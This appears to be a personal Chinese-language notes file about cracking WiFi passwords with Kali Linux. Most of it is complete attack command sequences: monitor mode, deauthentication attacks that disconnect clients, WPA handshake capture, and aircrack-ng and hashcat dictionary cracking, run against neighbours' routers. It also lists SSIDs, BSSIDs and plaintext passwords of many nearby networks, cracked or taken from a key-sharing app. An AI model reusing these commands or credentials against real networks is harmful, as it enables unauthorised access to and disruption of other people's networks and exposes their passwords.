@@ -1,0 +1,358 @@
+以前装过  u盘  chromeOS
+
+改天装个 u盘 kail 试试
+
+
+kail live  的默认密码 是  toor
+
+汗  用u盘启动后 不知道怎么安装 macbook air  2013  的 网卡 驱动 
+
+
+
+怎么 吧 kail 里面的字典 弄出来 
+
+
+Disk usage Analyzr  
+other  locations 里面可以打开 windows 盘或者 smb   连接到 共享文件夹
+
+
+kail  怎么建立共享  设置里面有共享 
+
+
+用以前 买的网卡 能用  rl8185
+
+aircrack-ng  没数据包 
+
+mk3   能生成大量 虚假 ssid
+
+
+
+在 fern-wifi 中 激活  混杂模式  然后 就能用
+airodump-ng -c  4  --bssid  08:57:00:4C:BF:E0  -w /root  wlan0mon
+抓某个路由器的数据包了  
+
+汗 突然 发现 混杂模式的  网卡能 抓信号范围内的 所有路由器 跟 手机的 mac
+
+不知道有什么 利用价值 
+
+
+
+
+先写写 步骤 然好进  kail里面操作吧 
+
+
+
+
+
+iwconfig
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+iwconfig
+
+
+airodump-ng wlan0  查看附近的无线网络
+airodump-ng -c 11 --bssid 08:57:00:4C:BF:E0 -w ~/Desktop/ wlan0   里面的6是channel
+aireplay-ng --deauth 2 -a 08:57:00:4C:BF:E0 -c   AC:BC:32:0B:D8:F4   wlan0
+aircrack-ng -a2 -b 08:57:00:4C:BF:E0 -w 1.txt  ~/Desktop/*.cap
+
+
+
+
+
+
+
+
+
+
+No valid WPA handshakes found..
+
+
+https://blog.csdn.net/qq_20480611/article/details/50478672
+
+改天再找原因 
+
+
+
+
+明天 看握手包的图片 
+
+
+
+
+
+6.16
+
+win10 计算hash   powershell
+
+
+Get-FileHash    C:\Users\win10\Desktop\kali-linux-2018.2-amd64.iso      -Algorithm SHA256
+
+
+
+6.19
+
+破解WiFi密码基础姿势合集
+
+
+kail 中 密码 相关工具  
+cewl  crunch  hashcat john  johnny   medusa  ncrack ophcrack  pyrit  rainbowcrack  rcracki——mt  wordlists
+
+6.20  
+有空
+弄几个 wifi试试
+
+
+http://www.anywlan.com/thread-247064-1-1.html?_dsign=be26943f
+
+
+http://www.sohu.com/a/230848171_354899  命令
+
+开启混杂模式 有两种办法   一种是用linux 命令 另一种是 用 airmon命令 
+
+airmon-ng start wlan0 
+airmon-ng check kill
+airodump-ng wlan0mon
+airodump-ng --bssid 08:57:00:4C:BF:E0 -c 11 -w 6d74aa wlan0mon
+aireplay-ng -0 3 -a 08:57:00:4C:BF:E0 wlan0mon      这个 貌似是 让多个客户端掉线
+aireplay-ng -0 3 -a 08:57:00:4C:BF:E0 -c AC:BC:32:0B:D8:F4 wlan0mon   下面的是让一个掉线
+aircrack-ng 6d74aa-01.cap -w /root/pwd/password.txt
+
+
+
+汗 今天还是抓不到 握手包
+
+
+6.21
+
+cnblogs.com/lifengfneg/p/5992649.html  mac   破解密码 
+
+如何查看 网卡芯片 lsusb    RTL8187
+
+
+aireplay-ng -0 3 -a 08:57:00:4C:BF:E0 wlan0mon      
+aireplay-ng -0 3 -a 08:57:00:4C:BF:E0 -c AC:BC:32:0B:D8:F4 wlan0mon   可以把这的数字3 改为30   然后就一直掉线 
+
+两种方式都试了试 抓不到 握手包 
+
+明天再说吧   看视频 睡觉 
+
+
+
+6.26
+
+改天 到 老爸那里试试 
+
+
+6.28
+虚拟机里面装一下 也不错啊 
+
+
+今天 拿  tenda 的 wpa  做实验吧 
+
+ok 几天  wpa  wpa2  都成功了 
+
+
+出现这个错误
+ioctl(SIOCGIFINDEX) failed: No such device
+是 wlan0mon 写错了
+
+airodump-ng --bssid   00:03:7F:00:66:13  -c 6 -w 6d74aa wlan0mon
+aireplay-ng -0 3 -a 00:03:7F:00:66:13 wlan0mon
+aireplay-ng -0 3 -a 00:03:7F:00:66:13 -c 0C:E7:25:B1:CD:30 wlan0mon 
+出现     WPA handshake: 00:03:7F:00:66:13  后
+
+
+aircrack-ng -a2 -b   00:03:7F:00:66:13  -w 1.txt  *.cap
+
+ok 破解成功
+
+今天  破解 wpa2  自己的openwrt 也成功
+
+PWR  越大 信号越好  比如  PWR  -20  比 -50 好
+frames  越大  数据包 越多 
+
+
+！！！！！！！！！！！！！！kail 的最小化    都在 窗口 左边
+
+
+！！！！！！！！！！！
+Disk usage Analyzr  
+other  locations 里面可以打开 windows 盘或者 smb   连接到 共享文件夹
+
+
+
+
+
+下面拿  24:69:68:75:3C:12   信道 1   做实验  tp-link_3c12
+有一个客户端 网上查 是小米的  
+74:23:44:E5:93:35
+
+
+草 密码  88888888
+
+
+tl-wr886n  密码   88888888  http://192.168.1.1/  admin 进不去   
+
+网上 找一下  wifi top 1000
+
+我常用的密码 11111112
+
+改天真机试试  我路由器
+
+
+
+
+汗 自己的 小米手机 root 但 万能钥匙 一用就断网
+金立手机  万能钥匙能用 但是没有root 
+
+新办法   金立 能连上的wifi  分享二维码 给  小米 然后  就可以从配置文件中找密码了 
+
+
+附近的Wi-Fi密码  
+万能钥匙的密码     卧室  阳台 
+Xiaomi_wang      64:09:80:19:BF:40     xiaomi R1CM    20110119
+TP-LINK_9E53A2   d8:15:0d:9e:53:a2   TL-WR842N        816208abc
+chenxi           08:10:79:4A:93:70   Realtek          19900707
+FAST_46B2        0c:d8:6c:71:46:b2      fast          www. 123456
+niuniu           44:97:5a:f6:95:cc     fast           20090807
+Tenda_3B8B68     C8:3a:35:3B:8b:68     Tenda          15269698754
+Tenda_543048     c8:3a:35:54:30:48     tenda          11223344
+liuzengyu        c8:3a:35:1E:a5:20     tenda          zmklfc88
+Netcore_5973DF   08:10:78:59:73:df                    wxcwxc1234
+PHICOMM_5BF18C   00:6b:8e:5b:f1:8c    feixun          11111111
+
+TP-LINK_C66690   1C:Fa:68:C6:66:90                    有钥匙汗 连不上
+D-Link_DIR-600A  D8:fe:e3:c7:9B:af                    有钥匙汗 连不上
+
+
+厨房 小屋
+TP-LINK_11A1     34:96:72:a3:11:a1                    15864766856
+TP-LINK_0DAD4E   c0:61:18:0d:ad:4e                    12345678
+002              b0:95:8e:60:d9:65     TP             87056217
+Netcore_634214   08:10:78:63:42:14                    tianzhe123456
+
+
+6.29
+
+今天用wifi 万能钥匙 找了一下密码 改天  再试吧  
+改天 把 xiaomi 的root 去掉 看看 万能钥匙还能用不   (点了下恢复出厂后，root还在 万能钥匙能用了)
+其实没必要 搞这么多密码 什么时候 断网了 再  用手机流量 抓
+
+
+7.10
+
+
+kail建立 windows 共享 
+https://blog.csdn.net/cyuyan112233/article/details/44496155
+关键点 public=no
+别换目录了  就用 /a/share 吧  不然 又出文件
+
+
+
+FC:7C:02:07:F2:E6  -63        3        2    0   4  54e  WPA2 CCMP   PSK  @PHIC
+airodump-ng --bssid FC:7C:02:07:F2:E6 -c 4 -w 6d74aa wlan0mon
+aireplay-ng -0 3 -a FC:7C:02:07:F2:E6 wlan0mon
+
+
+下面有2客户端
+F0:DB:E2:90:70:DD   苹果
+44:04:44:1D:4E:7A   oppo
+
+
+aircrack-ng -a2 -b   FC:7C:02:07:F2:E6  -w 1.txt  *.cap
+草  @PHICOMM_402  密码 12345678
+
+
+
+字典就用 里面的一个吧 挺好   字典5-6000常用密码字典.txt
+https://bbs.feng.com/read-htm-tid-7870208.html
+
+到此为止 kail 破解了2个了
+卧室阳台
+
+@PHICOMM_402     FC:7C:02:07:F2:E6     PHICOMM        12345678
+tp-link_3c12     24:69:68:75:3C:12                    88888888
+
+
+进攻 GAOKE_22da58  跑了 1小时   连数据包   都没有   中午再说  
+airodump-ng wlan0mon
+airodump-ng --bssid 00:16:78:22:DA:58 -c 11 -w 6d74aa wlan0mon
+aireplay-ng -0 3 -a 00:16:78:22:DA:58 wlan0mon
+aircrack-ng -a2 -b   00:16:78:22:DA:58  -w 1.txt  *.cap
+
+进攻  h3c_d0d2a0
+
+airodump-ng wlan0mon
+airodump-ng --bssid 70:3D:15:D0:D2:A2 -c 6 -w 6d74aa wlan0mon
+aireplay-ng -0 3 -a 70:3D:15:D0:D2:A2 wlan0mon
+aircrack-ng -a2 -b   70:3D:15:D0:D2:A2  -w 1.txt  *.cap
+
+有个客户端    huawei  
+94:0E:6B:23:49:AB
+
+搞到 握手包 但是  6000个常用里面 没有  
+
+试试  wifipr
+
+有继续按钮  能暂停  
+
+linux下面  这个 比较好 
+root@kali:~# aircrack-ng 6d74aa-01.cap -J 6d74aa.hccap 
+root@kali:~# hashcat -m 2500 6d74aa.hccap 1.txt #-m 2500是破解wpa/psk模式 
+
+
+进攻 mercury_302  
+
+mercury_302   这个 路由器 里面 有个 智能硬件  
+BC:5F:F6:7E:1E:49  
+
+airodump-ng --bssid BC:5F:F6:7E:1E:49   -c 1 -w 6d74aa wlan0mon
+aireplay-ng -0 3 -a BC:5F:F6:7E:1E:49   wlan0mon
+aircrack-ng -a2 -b   BC:5F:F6:7E:1E:49    -w 1.txt  *.cap
+
+客户端  
+20:F4:1B:4F:C4:6E  Shenzhen Bilian electronic CO.,LTD
+F0:79:E8:33:1F:81    OPPO
+
+
+
+搞到 握手包 但是  6000个常用里面 没有  
+
+
+汗 虚拟机 的 kail  搜不到 wifi
+到 mac 真机试了下    能搜到wifi了  并且第一次 抓到 握手包  汗  我的openwrt 死活抓不到 
+试了下  hashcat   跑包 汗  old haccp format  detected   you  need to  update
+
+
+重装下 vbox 里面的kail 吧
+
+貌似 虚拟机 vbox 里面用 kail live 也是个不错的方法   汗 黑屏  
+mac 装了个 迅雷 下载的 light 版本 
+
+
+7.11
+
+用的 kail 的  vbox 安装好的版本 
+
+
+https://blog.csdn.net/xuqi7/article/details/79063764
+
+
+kail  ssh  root@kali
+
+新下载的 kail vbox 还是扫不到wifi
+
+重启了下  mac  汗  kail vbox 突然 又能扫到wifi了
+
+
+
+2019.1.10
+
+brew install aircrack-ng
+/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
+sudo  airport en0 sniff 13  信道  
+这样好 不用装虚拟机  不用 kali  不用 新网卡  
+aircrack-ng -w 1.txt 1.cap
+缺陷  是 不能 让对方断网  直接获得 我手包 
+
+明天再说吧  
